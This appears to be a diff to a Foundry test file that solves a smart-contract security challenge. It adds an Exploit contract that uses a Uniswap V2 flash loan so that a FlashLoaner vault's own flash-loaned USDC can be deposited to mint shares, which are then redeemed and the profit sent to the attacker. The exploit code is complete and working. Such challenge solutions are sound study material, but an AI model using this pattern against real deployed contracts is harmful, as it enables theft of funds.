@@ -105,6 +105,13 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        //In this challenge the vulnerability is quite easy
+        //We are able to do a flashloan with flashLoaner and deposit the amount for minting share
+        //There is no check for reentrant or to be sure that the balance of flashLoaner is not used when deposit() is called
+        Exploit exploit = new Exploit(address(flashLoaner), address(usdc),address(uniPair));
+        exploit.pwn();
+        console.log("balance usdc of attacker : ",usdc.balanceOf(address(attacker)));
+        console.log("balance usdc of flashLoaner : ",usdc.balanceOf(address(flashLoaner)));
 
         vm.stopPrank();
         validation();
@@ -119,4 +126,47 @@ contract Testing is Test {
 
     }
 
+}
+
+contract Exploit {
+
+    FlashLoaner flashLoaner;
+    Token usdc;
+    IUniswapV2Pair uniPair;
+    address private attacker;
+    
+    constructor(address _target, address _usdc, address _uniPair){
+        flashLoaner = FlashLoaner(_target);
+        usdc = Token(_usdc);
+        uniPair = IUniswapV2Pair(_uniPair);
+        attacker = msg.sender;
+        usdc.approve(address(flashLoaner),type(uint).max);
+
+    }
+
+    
+
+    //Will be called during flash()
+    //We will deposit the amount get from flash() and pass all the check with balanceBefore and balanceAfter
+    function flashCallback(uint256 fee, bytes calldata data) external {
+        flashLoaner.deposit(100_000e18,address(this));
+        usdc.transfer(address(flashLoaner),fee); //Send the fee for the flashloan
+    }
+
+    //We are using a flashloan from univ2 in order to pay the fee for using flash() from flashLoaner
+    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {
+        console.log("balance usdc of exploit : ",usdc.balanceOf(address(this)));
+        flashLoaner.flash(address(this),usdc.balanceOf(address(flashLoaner))-1,new bytes(0));
+        console.log("balance share fusdc of exploit : ",flashLoaner.balanceOf(address(this)));
+        flashLoaner.redeem(flashLoaner.balanceOf(address(this)),address(this), address(this));
+        console.log("balance share fusdc of exploit : ",flashLoaner.balanceOf(address(this)));
+        console.log("balance usdc of exploit : ",usdc.balanceOf(address(this)));
+        console.log("amount to repay : ",(amount0Out * 103 /100)+1);//yeah the premium is a bit to high
+        usdc.transfer(address(uniPair), (amount0Out * 103 /100)+1);
+    }
+    
+    function pwn() external{
+        uniPair.swap(10_000e18,0,address(this), new bytes(1));
+        usdc.transfer(attacker, usdc.balanceOf(address(this)));
+    }
 }
